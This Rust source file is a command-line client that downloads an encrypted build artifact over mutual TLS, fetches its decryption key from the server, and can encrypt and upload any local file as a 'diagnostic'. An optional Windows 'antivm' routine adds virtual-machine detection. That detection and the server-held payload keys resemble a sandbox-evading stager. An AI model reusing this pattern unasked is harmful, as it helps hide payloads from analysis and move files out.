use std::fs::File;
use std::io::{BufWriter, Read, Write};
use std::path::{Path, PathBuf};
use std::time::Duration;

use anyhow::{bail, Context, Result};
use clap::Parser;
use common::pgp;
use common::proto::{KeyResponse, UploadResponse};
use reqwest::blocking::{Body, Client};
use reqwest::{Certificate, Identity};

include!(concat!(env!("OUT_DIR"), "/config.rs"));

#[derive(Parser)]
#[command(name = "client")]
struct Args {
    #[arg(long)]
    out: Option<PathBuf>,

    #[arg(long)]
    upload: Option<PathBuf>,

    #[arg(long, default_value = SERVER_URL)]
    server: String,

    #[arg(long, default_value = BUILD_ID)]
    build_id: String,
}

#[cfg(all(windows, feature = "antivm"))]
fn vm_protection() {
    antivm::ProtectionBuilder::new()
        .set_vm(true)
        .set_ip(false)
        .set_http(false)
        .set_network(false)
        .set_screen(false)
        .set_cpu(false)
        .set_ram(false)
        .init();
}

fn build_client() -> Result<Client> {
    let ca = Certificate::from_pem(CA_CERT).context("failed to load embedded ca certificate")?;
    let identity =
        Identity::from_pem(CLIENT_IDENTITY).context("failed to load embedded client identity")?;

    Client::builder()
        .use_rustls_tls()
        .add_root_certificate(ca)
        .identity(identity)
        .timeout(Duration::from_secs(120))
        .build()
        .context("failed to build http client")
}

fn download_artifact(client: &Client, server: &str, build_id: &str, tmp: &Path) -> Result<()> {
    let url = format!("{server}/builds/{build_id}/artifact");
    let mut response = client
        .get(&url)
        .send()
        .with_context(|| format!("failed to request {url}"))?;
    if !response.status().is_success() {
        bail!("artifact request failed with status {}", response.status());
    }

    let file = File::create(tmp)
        .with_context(|| format!("failed to create temp file {}", tmp.display()))?;
    let mut writer = BufWriter::new(file);

    let mut buf = vec![0u8; 64 * 1024];
    loop {
        let n = response
            .read(&mut buf)
            .context("failed to read artifact chunk")?;
        if n == 0 {
            break;
        }
        writer
            .write_all(&buf[..n])
            .with_context(|| format!("failed to write chunk to {}", tmp.display()))?;
    }
    writer
        .flush()
        .with_context(|| format!("failed to flush {}", tmp.display()))?;
    Ok(())
}

fn fetch_key(client: &Client, server: &str, build_id: &str) -> Result<KeyResponse> {
    let url = format!("{server}/builds/{build_id}/key");
    let response = client
        .get(&url)
        .send()
        .with_context(|| format!("failed to request {url}"))?;
    if !response.status().is_success() {
        bail!("key request failed with status {}", response.status());
    }
    response.json::<KeyResponse>().context("failed to parse key response")
}

fn tmp_path_for(out: &Path) -> PathBuf {
    match out.file_name().and_then(|n| n.to_str()) {
        Some(name) => out.with_file_name(format!("{name}.part")),
        None => out.with_file_name("download.part"),
    }
}

fn encrypt_diagnostic(pub_armored: &str, plaintext: &[u8]) -> Result<Vec<u8>> {
    pgp::encrypt_to_public(plaintext, pub_armored)
}

fn upload_diagnostic(
    client: &Client,
    server: &str,
    build_id: &str,
    pub_armored: &str,
    file: &Path,
) -> Result<UploadResponse> {
    let plaintext = std::fs::read(file)
        .with_context(|| format!("failed to read diagnostic file {}", file.display()))?;
    let ciphertext = encrypt_diagnostic(pub_armored, &plaintext)?;

    let tmp = tmp_path_for(file);
    std::fs::write(&tmp, &ciphertext)
        .with_context(|| format!("failed to write temp file {}", tmp.display()))?;

    let result = send_diagnostic(client, server, build_id, file, &tmp);
    let _ = std::fs::remove_file(&tmp);
    result
}

fn send_diagnostic(
    client: &Client,
    server: &str,
    build_id: &str,
    file: &Path,
    tmp: &Path,
) -> Result<UploadResponse> {
    let filename = file
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("diagnostic");
    let url = format!("{server}/builds/{build_id}/diagnostics");

    let upload =
        File::open(tmp).with_context(|| format!("failed to open temp file {}", tmp.display()))?;

    let response = client
        .post(&url)
        .header("X-Diagnostic-Filename", filename)
        .header(reqwest::header::CONTENT_TYPE, "application/octet-stream")
        .body(Body::new(upload))
        .send()
        .with_context(|| format!("failed to request {url}"))?;
    if !response.status().is_success() {
        bail!("diagnostic upload failed with status {}", response.status());
    }
    response
        .json::<UploadResponse>()
        .context("failed to parse upload response")
}

fn run(client: &Client, args: &Args, out: &Path, tmp: &Path) -> Result<()> {
    download_artifact(client, &args.server, &args.build_id, tmp)?;

    let ciphertext = std::fs::read(tmp)
        .with_context(|| format!("failed to read temp file {}", tmp.display()))?;
    let key = fetch_key(client, &args.server, &args.build_id)?;

    let plaintext = pgp::decrypt(&ciphertext, &key.priv_armored, &key.passphrase)?;

    std::fs::write(out, &plaintext).with_context(|| format!("failed to write {}", out.display()))?;
    Ok(())
}

fn main() -> Result<()> {
    #[cfg(all(windows, feature = "antivm"))]
    vm_protection();

    let args = Args::parse();
    let client = build_client()?;

    if let Some(file) = &args.upload {
        let pub_armored = std::str::from_utf8(PUB_KEY)
            .context("embedded build public key is not valid utf-8")?;
        if pub_armored.trim().is_empty() {
            bail!("no build public key embedded in this client (standalone dev build?)");
        }
        let resp = upload_diagnostic(&client, &args.server, &args.build_id, pub_armored, file)?;
        println!(
            "diagnostic uploaded: {} ({} encrypted bytes) for {}",
            resp.filename, resp.bytes, resp.build_id
        );
        return Ok(());
    }

    let Some(out) = args.out.clone() else {
        bail!("--out is required for download (or pass --upload <file> to upload a diagnostic)");
    };

    let tmp = tmp_path_for(&out);
    let result = run(&client, &args, &out, &tmp);
    let _ = std::fs::remove_file(&tmp);
    result?;

    println!("decrypted file written to {}", out.display());
    Ok(())
}
